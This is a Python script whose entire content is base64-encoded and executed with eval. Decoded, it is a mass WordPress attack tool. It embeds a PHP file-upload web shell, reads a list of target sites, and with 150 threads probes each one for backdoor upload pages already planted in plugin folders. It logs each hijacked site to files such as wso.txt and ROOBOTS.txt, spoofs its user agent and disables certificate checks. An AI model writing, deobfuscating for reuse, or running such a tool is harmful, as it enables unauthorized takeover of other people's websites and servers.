#!/usr/bin/env python
import base64
unknownkece = """IyAtKi1jb2Rpbmc6TGF0aW4tMSAtKg0KaW1wb3J0IHN5cyAsIHJlcXVlc3RzLCByZQ0KZnJvbSBtdWx0aXByb2Nlc3NpbmcuZHVtbXkgaW1wb3J0IFBvb2wNCmZyb20gY29sb3JhbWEgaW1wb3J0IEZvcmUNCmZyb20gY29sb3JhbWEgaW1wb3J0IGluaXQNCmluaXQoYXV0b3Jlc2V0PVRydWUpDQoNCmZyICA9ICAgRm9yZS5SRUQNCmZjICA9ICAgRm9yZS5DWUFODQpmdyAgPSAgIEZvcmUuV0hJVEUNCmZnICA9ICAgRm9yZS5HUkVFTg0KZm0gID0gICBGb3JlLk1BR0VOVEENCg0KDQpwcmludCAiIiINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fICAgICAgICAgICAgX18gIF9fIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvICB8ICAgICAgICAgIC8gIHwvICB8DQogX19fX18gIF9fX18gICBfXyAgICBfXyAgX19fX19fXyAgICBfX19fX18gICQkLyAgIF9fX19fXyAgJCQgfCQkIHwNCi8gICAgIFwvICAgIFwgLyAgfCAgLyAgfC8gICAgICAgXCAgLyAgICAgIFwgLyAgfCAvICAgICAgXCAkJCB8JCQgfA0KJCQkJCQkICQkJCQgIHwkJCB8ICAkJCB8JCQkJCQkJCAgfC8kJCQkJCQgIHwkJCB8LyQkJCQkJCAgfCQkIHwkJCB8DQokJCB8ICQkIHwgJCQgfCQkIHwgICQkIHwkJCB8ICAkJCB8JCQgfCAgJCQgfCQkIHwkJCAgICAkJCB8JCQgfCQkIHwNCiQkIHwgJCQgfCAkJCB8JCQgXF9fJCQgfCQkIHwgICQkIHwkJCBcX18kJCB8JCQgfCQkJCQkJCQkLyAkJCB8JCQgfA0KJCQgfCAkJCB8ICQkIHwkJCAgICAkJC8gJCQgfCAgJCQgfCQkICAgICQkIHwkJCB8JCQgICAgICAgfCQkIHwkJCB8DQokJC8gICQkLyAgJCQvICAkJCQkJCQvICAkJC8gICAkJC8gICQkJCQkJCQgfCQkLyAgJCQkJCQkJC8gJCQvICQkLyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvICBcX18kJCB8ICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICQkICAgICQkLyAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICQkJCQkJC8gICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgbXVuZ2llbGwxMzM3DQogICAgICAgICAgICAgICAgVG9vbGllIDogd3AgcmNlDQogICAgICAgICAgICAgICAgIA0KICAgICAgICBdLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLVsNCiIiIg0Kc2hlbGwgPSAiIiI8P3BocCBlY2hvICJSYWl6MFdvck0iOyBlY2hvICI8YnI+Ii5waHBfdW5hbWUoKS4iPGJyPiI7IGVjaG8gIjxmb3JtIG1ldGhvZD0ncG9zdCcgZW5jdHlwZT0nbXVsdGlwYXJ0L2Zvcm0tZGF0YSc+IDxpbnB1dCB0eXBlPSdmaWxlJyBuYW1lPSd6Yic+PGlucHV0IHR5cGU9J3N1Ym1pdCcgbmFtZT0ndXBsb2FkJyB2YWx1ZT0ndXBsb2FkJz48L2Zvcm0+IjsgaWYoJF9QT1NUWyd1cGxvYWQnXSkgeyBpZihAY29weSgkX0ZJTEVTWyd6YiddWyd0bXBfbmFtZSddLCAkX0ZJTEVTWyd6YiddWyduYW1lJ10pKSB7IGVjaG8gImVYcGxvaXRpbmcgRG9uZSI7IH0gZWxzZSB7IGVjaG8gIkZhaWxlZCB0byBVcGxvYWQuIjsgfSB9ID8+IiIiDQpyZXF1ZXN0cy51cmxsaWIzLmRpc2FibGVfd2FybmluZ3MoKQ0KaGVhZGVycyA9IHsnQ29ubmVjdGlvbic6ICdrZWVwLWFsaXZlJywNCiAgICAgICAgICAgICdDYWNoZS1Db250cm9sJzogJ21heC1hZ2U9MCcsDQogICAgICAgICAgICAnVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0cyc6ICcxJywNCiAgICAgICAgICAgICdVc2VyLUFnZW50JzogJ01vemxpbGEvNS4wIChMaW51eDsgQW5kcm9pZCA3LjA7IFNNLUc4OTJBIEJ1bGlkL05SRDkwTTsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS82MC4wLjMxMTIuMTA3IE1vYmxpZSBTYWZhcmkvNTM3LjM2JywNCiAgICAgICAgICAgICdBY2NlcHQnOiAndGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCcsDQogICAgICAgICAgICAnQWNjZXB0LUVuY29kaW5nJzogJ2d6aXAsIGRlZmxhdGUnLA0KICAgICAgICAgICAgJ0FjY2VwdC1MYW5ndWFnZSc6ICdlbi1VUyxlbjtxPTAuOSxmcjtxPTAuOCcsDQogICAgICAgICAgICAncmVmZXJlcic6ICd3d3cuZ29vZ2xlLmNvbSd9DQp0cnk6DQogICAgdGFyZ2V0ID0gW2kuc3RyaXAoKSBmb3IgaSBpbiBvcGVuKHN5cy5hcmd2WzFdLCBtb2RlPSdyJykucmVhZGxpbmVzKCldDQpleGNlcHQgSW5kZXhFcnJvcjoNCiAgICBwYXRoID0gc3RyKHN5cy5hcmd2WzBdKS5zcGxpdCgnXFwnKQ0KICAgIGV4aXQoJ1xuICBbIV0gRW50ZXIgPCcgKyBwYXRoW2xlbihwYXRoKSAtIDFdICsgJz4gPHNpdGVzLnR4dD4nKQ0KDQpkZWYgVVJMZG9tYWluKHNpdGUpOg0KICAgIGlmIHNpdGUuc3RhcnRzd2l0aCgiaHR0cDovLyIpIDoNCiAgICAgICAgc2l0ZSA9IHNpdGUucmVwbGFjZSgiaHR0cDovLyIsIiIpDQogICAgZWxpZiBzaXRlLnN0YXJ0c3dpdGgoImh0dHBzOi8vIikgOg0KICAgICAgICBzaXRlID0gc2l0ZS5yZXBsYWNlKCJodHRwczovLyIsIiIpDQogICAgZWxzZSA6DQogICAgICAgIHBhc3MNCiAgICBwYXR0ZXJuID0gcmUuY29tcGlsZSgnKC4qKS8nKQ0KICAgIHdoaWxlIHJlLmZpbmRhbGwocGF0dGVybixzaXRlKToNCiAgICAgICAgc2l0ZXogPSByZS5maW5kYWxsKHBhdHRlcm4sc2l0ZSkNCiAgICAgICAgc2l0ZSA9IHNpdGV6WzBdDQogICAgcmV0dXJuIHNpdGUNCg0KDQpkZWYgRm91ckh1bmRyZWRUaHJlZSh1cmwpOg0KICAgIHRyeToNCiAgICAgICAgdXJsID0gJ2h0dHA6Ly8nICsgVVJMZG9tYWluKHVybCkNCiAgICAgICAgY2hlY2sgPSByZXF1ZXN0cy5nZXQodXJsKycvd3AtY29udGVudC9wbHVnaW5zL2FudHR0L3NpbXBsZS5waHAnLGhlYWRlcnM9aGVhZGVycywgYWxsb3dfcmVkaXJlY3RzPVRydWUsdGltZW91dD0xNSkNCiAgICAgICAgaWYgJ2lucHV0IHR5cGU9ImZpbGUiIGlkPSJpbnB1dGZpbGUiIG5hbWU9ImlucHV0ZmlsZSInIGluIGNoZWNrLmNvbnRlbnQ6DQogICAgICAgICAgICAgICAgcHJpbnQgJyAtfCAnICsgdXJsICsgJyAtLT4ge31bU3VjY2VmdWxseV0nLmZvcm1hdChmZykNCiAgICAgICAgICAgICAgICBvcGVuKCdzaW1wbGUudHh0JywgJ2EnKS53cml0ZSh1cmwgKyAnL3dwLWNvbnRlbnQvcGx1Z2lucy9hbnR0dC9zaW1wbGUucGhwXG4nKQ0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgdXJsID0gJ2h0dHBzOi8vJyArIFVSTGRvbWFpbih1cmwpDQogICAgICAgICAgICBjaGVjayA9IHJlcXVlc3RzLmdldCh1cmwrJy93cC1jb250ZW50L3BsdWdpbnMvVE9QWE9IL3dEUi5waHAnLGhlYWRlcnM9aGVhZGVycywgYWxsb3dfcmVkaXJlY3RzPVRydWUsdmVyaWZ5PUZhbHNlICx0aW1lb3V0PTE1KQ0KICAgICAgICAgICAgaWYgJ0ZpbGVzTWFuJyBpbiBjaGVjay5jb250ZW50Og0KICAgICAgICAgICAgICAgICAgICBwcmludCAnIC18ICcgKyB1cmwgKyAnIC0tPiB7fVtTdWNjZWZ1bGx5XScuZm9ybWF0KGZnKQ0KICAgICAgICAgICAgICAgICAgICBvcGVuKCd3c28udHh0JywgJ2EnKS53cml0ZSh1cmwgKyAnL3dwLWNvbnRlbnQvcGx1Z2lucy9UT1BYT0gvd0RSLnBocFxuJykNCiAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgcHJpbnQgJyAtfCAnICsgdXJsICsgJyAtLT4ge31bRmFpbGVkXScuZm9ybWF0KGZyKQ0KICAgICAgICAgICAgICAgIHVybCA9ICdodHRwOi8vJyArIFVSTGRvbWFpbih1cmwpDQogICAgICAgIGNoZWNrID0gcmVxdWVzdHMuZ2V0KHVybCsnL3dwLWNvbnRlbnQvcGx1Z2lucy93b3JkcHJlc3NzM2NsbC91cC5waHAnLGhlYWRlcnM9aGVhZGVycywgYWxsb3dfcmVkaXJlY3RzPVRydWUsdGltZW91dD0xNSkNCiAgICAgICAgaWYgJ2VuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiPjxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJidHVsIj48YnV0dG9uPkdhc2thbjwnIGluIGNoZWNrLmNvbnRlbnQ6DQogICAgICAgICAgICAgICAgcHJpbnQgJyAtfCAnICsgdXJsICsgJyAtLT4ge31bU3VjY2VmdWxseV0nLmZvcm1hdChmZykNCiAgICAgICAgICAgICAgICBvcGVuKCdHYXNrYW5TaGVsbHMudHh0JywgJ2EnKS53cml0ZSh1cmwgKyAnL3dwLWNvbnRlbnQvcGx1Z2lucy93b3JkcHJlc3NzM2NsbC91cC5waHBcbicpDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICB1cmwgPSAnaHR0cHM6Ly8nICsgVVJMZG9tYWluKHVybCkNCiAgICAgICAgICAgIGNoZWNrID0gcmVxdWVzdHMuZ2V0KHVybCsnL3dwLWNvbnRlbnQvcGx1Z2lucy93cC1maWxlLXVwbG9hZC9ST09CT1RTLnBocCcsaGVhZGVycz1oZWFkZXJzLCBhbGxvd19yZWRpcmVjdHM9VHJ1ZSx2ZXJpZnk9RmFsc2UgLHRpbWVvdXQ9MTUpDQogICAgICAgICAgICBpZiAnVXBsMG9kIFlvdXIgVDBvbHMnIGluIGNoZWNrLmNvbnRlbnQ6DQogICAgICAgICAgICAgICAgICAgIHByaW50ICcgLXwgJyArIHVybCArICcgLS0+IHt9W1N1Y2NlZnVsbHldJy5mb3JtYXQoZmcpDQogICAgICAgICAgICAgICAgICAgIG9wZW4oJ1JPT0JPVFMudHh0JywgJ2EnKS53cml0ZSh1cmwgKyAnL3dwLWNvbnRlbnQvcGx1Z2lucy93cC1maWxlLXVwbG9hZC9ST09CT1RTLnBocFxuJykNCiAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgcHJpbnQgJyAtfCAnICsgdXJsICsgJyAtLT4ge31bRmFpbGVkXScuZm9ybWF0KGZyKQ0KICAgIGV4Y2VwdCA6DQogICAgICAgIHByaW50ICcgLXwgJyArIHVybCArICcgLS0+IHt9W0ZhaWxlZF0nLmZvcm1hdChmcikNCg0KbXAgPSBQb29sKDE1MCkNCm1wLm1hcChGb3VySHVuZHJlZFRocmVlLCB0YXJnZXQpDQptcC5jbG9zZSgpDQptcC5qb2luKCkNCg0KcHJpbnQgJ1xuIFshXSB7fVNhdmVkIGluIFNoZWxscy50eHQnLmZvcm1hdChmYyk="""
eval(compile(base64.b64decode(unknownkece),"<string>","exec"))